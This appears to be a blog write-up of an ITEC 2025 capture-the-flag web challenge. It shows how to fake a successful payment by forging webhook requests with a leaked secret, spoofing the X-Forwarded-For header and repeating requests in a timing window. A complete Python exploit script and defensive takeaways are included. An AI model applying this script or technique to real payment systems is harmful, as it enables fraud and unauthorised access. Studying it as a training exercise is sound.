---
title: "Phantom Transaction — ITEC 2025 CTF"
description: "Forging webhook requests with a known HMAC secret and IP spoofing via X-Forwarded-For to trigger a payment success and retrieve the flag."
pubDate: 2025-03-20
tags: ["web", "itec", "webhook", "python"]
---

**Category:** Web / API
**Flag:** `itec{ph4nt0m_7r4n$4ct10n_4ch13v3d}`

## Challenge

A payment processor at `/pay` creates transactions. An internal backend sends webhooks to `/api/v1/webhook` to update transaction status. The goal: make the server accept a transaction as `"success"` without going through the real payment flow.

## Key observations

1. `/pay` creates a transaction and returns a `transaction_id` and `valid_until` timestamp.
2. The webhook endpoint validates two things:
   - Source IP must be from the internal network (`192.168.x.x`)
   - `X-Webhook-Signature` header: `SHA256(transaction_id + secret_key)`
3. The secret key `webhook_secret_1345` was leaked from logs/source.

## Exploit strategy

1. Create a transaction with `trigger_webhook: True`.
2. Wait until just before `valid_until` expires.
3. Send a forged POST to `/api/v1/webhook` with:
   - `X-Forwarded-For: 192.168.1.100` (IP spoofing via header)
   - Correctly computed `X-Webhook-Signature`
   - `"status": "success"` payload
4. Spam requests in the narrow timing window.

## Script

```python
import requests
import hashlib
import time

url = "http://cyber.itec.ro:25466"
secret_key = "webhook_secret_1345"

# Create transaction
r = requests.post(url + "/pay", json={
    "username": "elite_hacker",
    "amount": 999999999999,
    "trigger_webhook": True
})
data = r.json()
transaction = data['transaction_id']
valid_until = data['valid_until']

# Wait until just before expiry
sleep_time = valid_until - time.time()
if sleep_time > 0:
    time.sleep(sleep_time - 0.49)

# Forge signature
signature = hashlib.sha256(
    (transaction + secret_key).encode()
).hexdigest()

headers = {
    "X-Forwarded-For": "192.168.1.100",
    "X-Webhook-Signature": signature
}
payload = {
    "transaction_id": transaction,
    "status": "success"
}

# Spam to hit the race window
for _ in range(1000):
    resp = requests.post(url + "/api/v1/webhook", headers=headers, json=payload)
    if "flag" in resp.text:
        print(resp.text)
        break
```

## Takeaways

- `X-Forwarded-For` is trivially spoofable — never rely on it for access control.
- Hardcoded secrets in source/logs are a critical vulnerability.
- Timing attacks are viable when short validity windows exist.
- Internal webhook endpoints should require mutual TLS or network-level isolation, not just IP checks.
